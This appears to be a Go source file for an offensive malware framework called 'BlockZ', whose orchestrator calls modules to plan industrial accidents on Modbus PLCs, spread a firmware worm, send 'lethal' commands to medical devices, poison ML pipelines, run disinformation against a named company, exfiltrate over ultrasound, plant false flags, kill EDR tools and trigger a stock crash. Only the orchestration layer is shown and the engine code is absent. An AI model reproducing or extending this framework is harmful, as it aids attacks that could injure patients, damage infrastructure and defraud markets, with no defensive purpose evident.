package blockz

import (
	"context"
	"fmt"
	"sync"
)

type BlockZOrchestrator struct {
	Config           *BlockZConfig
	GeneticEvo       *GeneticEvolutionEngine
	Deepfake         *DeepfakeEngine
	SCADACovert      *SCADACovertEngine
	FirmwareWorm     *FirmwareWormEngine
	MedicalAttack    *MedicalAttackEngine
	ModelPoison      *ModelPoisonEngine
	Disinfo          *DisinformationEngine
	AirGap           *AirGapEngine
	PostQuantum      *PostQuantumEngine
	DeadMan          *DeadManSwitchEngine
	FalseFlag        *FalseFlagEngine
	EDRControl       *EDRControlEngine
	Financial        *FinancialAttackEngine
	IoTChain         *IoTPhysicalChainEngine
	Report           *BlockZReport
	mu               sync.Mutex
}

func NewBlockZOrchestrator(cfg *BlockZConfig) *BlockZOrchestrator {
	return &BlockZOrchestrator{
		Config:        cfg,
		GeneticEvo:    NewGeneticEvolutionEngine(cfg),
		Deepfake:      NewDeepfakeEngine(cfg),
		SCADACovert:   NewSCADACovertEngine(cfg),
		FirmwareWorm:  NewFirmwareWormEngine(cfg),
		MedicalAttack: NewMedicalAttackEngine(cfg),
		ModelPoison:   NewModelPoisonEngine(cfg),
		Disinfo:       NewDisinformationEngine(cfg),
		AirGap:        NewAirGapEngine(cfg),
		PostQuantum:   NewPostQuantumEngine(cfg),
		DeadMan:       NewDeadManSwitchEngine(cfg),
		FalseFlag:     NewFalseFlagEngine(cfg),
		EDRControl:    NewEDRControlEngine(cfg),
		Financial:     NewFinancialAttackEngine(cfg),
		IoTChain:      NewIoTPhysicalChainEngine(cfg),
		Report:        &BlockZReport{},
	}
}

func (bz *BlockZOrchestrator) ExecuteBlockZ(ctx context.Context, companyName string) (*BlockZReport, error) {
	bz.Report.Success = true
	bz.Report.ModulesExecuted = 0

	if bz.Config.DeadMansSwitch {
		bz.DeadMan.Arm()
		bz.Report.DeadManArmed = true
	}

	if bz.Config.GeneticEvolution {
		if err := ctx.Err(); err != nil {
			return bz.Report, err
		}
		bz.GeneticEvo.Evolve(3)
		bz.Report.GenerationCount = bz.GeneticEvo.Generation
		bz.Report.BestFitness = bz.GeneticEvo.BestFitness
		bz.Report.ModulesExecuted++
	}

	if bz.Config.DeepfakeEnable {
		if err := ctx.Err(); err != nil {
			return bz.Report, err
		}
		bz.Deepfake.HarvestMedia()
		for _, cmd := range credibleCommands[:2] {
			bz.Deepfake.GenerateDeepfake(cmd)
		}
		bz.Report.DeepfakesGenerated = bz.Deepfake.GeneratedDeepfakes
		bz.Report.ModulesExecuted++
	}

	if bz.Config.SCADACovert {
		if err := ctx.Err(); err != nil {
			return bz.Report, err
		}
		plc := PLCDevice{IP: "192.168.1.100", Port: 502, Vendor: "Schneider", Protocol: "modbus"}
		bz.SCADACovert.PlanIndustrialAccident(plc)
		bz.SCADACovert.ApplyGradualChanges()
		bz.Report.SCADAGradual = len(bz.SCADACovert.GradualOps)
		bz.Report.ModulesExecuted++
	}

	if bz.Config.FirmwareWorm {
		if err := ctx.Err(); err != nil {
			return bz.Report, err
		}
		devices := bz.FirmwareWorm.ScanNetworkDevices("192.168.1.0/24")
		for _, dev := range devices {
			bz.FirmwareWorm.InfectDevice(dev)
		}
		bz.Report.FirmwareInfections = len(bz.FirmwareWorm.WormedDevices)
		bz.Report.ModulesExecuted++
	}

	if bz.Config.MedicalAttack {
		if err := ctx.Err(); err != nil {
			return bz.Report, err
		}
		bz.MedicalAttack.ScanMedicalDevices()
		for _, dev := range bz.MedicalAttack.MedicalDevices[:min(2, len(bz.MedicalAttack.MedicalDevices))] {
			bz.MedicalAttack.SendLethalCommand(dev)
		}
		bz.Report.MedicalExploits = bz.MedicalAttack.ExploitedDevices
		bz.Report.ModulesExecuted++
	}

	if bz.Config.ModelPoisoning {
		if err := ctx.Err(); err != nil {
			return bz.Report, err
		}
		bz.ModelPoison.FindMLPipelines()
		bz.ModelPoison.DeployBackdoorModel()
		bz.Report.ModelsPoisoned = bz.ModelPoison.ModelsCorrupted
		bz.Report.ModulesExecuted++
	}

	if bz.Config.Disinformation {
		if err := ctx.Err(); err != nil {
			return bz.Report, err
		}
		bz.Disinfo.StartCampaign(companyName)
		bz.Report.DisinfoMessages = bz.Disinfo.MessagesSent
		bz.Report.ModulesExecuted++
	}

	if bz.Config.AirGapJump {
		bz.AirGap.ExfiltrateViaUltrasound([]byte("X404X_DATA_EXFIL"))
		bz.Report.AirGapExfilBytes = bz.AirGap.ExfiltratedBytes
		bz.Report.ModulesExecuted++
	}

	if bz.Config.PostQuantum {
		bz.PostQuantum.GenerateKyberKeypair()
		bz.Report.KyberKeysGenerated = bz.PostQuantum.KeypairsGen
		bz.Report.ModulesExecuted++
	}

	if bz.Config.FalseFlagFraming {
		bz.FalseFlag.PlantFalseFlags()
		bz.FalseFlag.GenerateMandiantReport()
		bz.Report.FalseFlagsPlanted = bz.FalseFlag.ArtefactsPlanted
		bz.Report.ModulesExecuted++
	}

	if bz.Config.EDRControl {
		bz.EDRControl.KillAllEDRs()
		bz.Report.EDRSelfDeployCount = bz.EDRControl.SelfDeployed
		bz.Report.ModulesExecuted++
	}

	if bz.Config.FinancialAttack {
		bz.Financial.HarvestInsiderInfo()
		bz.Financial.TriggerStockCrash()
		bz.Report.FinancialPositions = len(bz.Financial.InsiderInfo)
		bz.Report.ModulesExecuted++
	}

	if bz.Config.IoTPhysicalChain {
		bz.IoTChain.ScanIoTDevices("10.0.0.0/16")
		bz.IoTChain.AttackAllZones()
		bz.Report.IoTDevicesKilled = bz.IoTChain.HijackedDevices
		bz.Report.ModulesExecuted++
	}

	return bz.Report, nil
}

func (bz *BlockZOrchestrator) GetFullStatusJSON() string {
	return fmt.Sprintf(`{"block_z_report": {"modules_executed":%d,"success":%v,"edr":%d,"genetic":%d,"deepfake":%d,"scada":%d,"firmware":%d,"medical":%d,"model":%d,"disinfo":%d,"airgap":%d,"quantum":%d,"deadman":%v,"falseflag":%d,"financial":%d,"iot":%d}}`,
		bz.Report.ModulesExecuted, bz.Report.Success, bz.Report.EDRSelfDeployCount,
		bz.Report.GenerationCount, bz.Report.DeepfakesGenerated,
		bz.Report.SCADAGradual, bz.Report.FirmwareInfections,
		bz.Report.MedicalExploits, bz.Report.ModelsPoisoned,
		bz.Report.DisinfoMessages, bz.Report.AirGapExfilBytes,
		bz.Report.KyberKeysGenerated, bz.Report.DeadManArmed,
		bz.Report.FalseFlagsPlanted, bz.Report.FinancialPositions,
		bz.Report.IoTDevicesKilled)
}
